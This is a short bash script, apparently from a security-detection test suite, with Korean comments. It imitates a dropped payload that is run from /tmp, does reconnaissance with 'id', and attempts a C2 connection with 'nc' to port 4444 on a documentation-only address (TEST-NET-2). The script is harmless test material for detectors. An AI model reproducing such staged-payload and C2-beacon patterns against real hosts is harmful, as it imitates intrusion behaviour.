#!/bin/bash
# scenarios/payload.sh — 시나리오 1 의 "페이로드" (무해한 흉내)
#
# scenario-1 이 curl(file://) 로 /tmp 아래에 떨어뜨려 실행한다.
# 탐지 대상: 임시경로에서의 실행 자체 + 내부 행위(정찰, nc 로 C2 접속 시도).
echo "[payload] running from $0"
id > /dev/null                      # 정찰 흉내 (화이트리스트 → drop)
if command -v nc > /dev/null; then
  # C2 접속 시도 흉내. 198.51.100.7 = 문서용 예약 대역(TEST-NET-2), 실제 호스트 없음. 1초 타임아웃.
  nc -z -w1 198.51.100.7 4444 2> /dev/null || true
fi
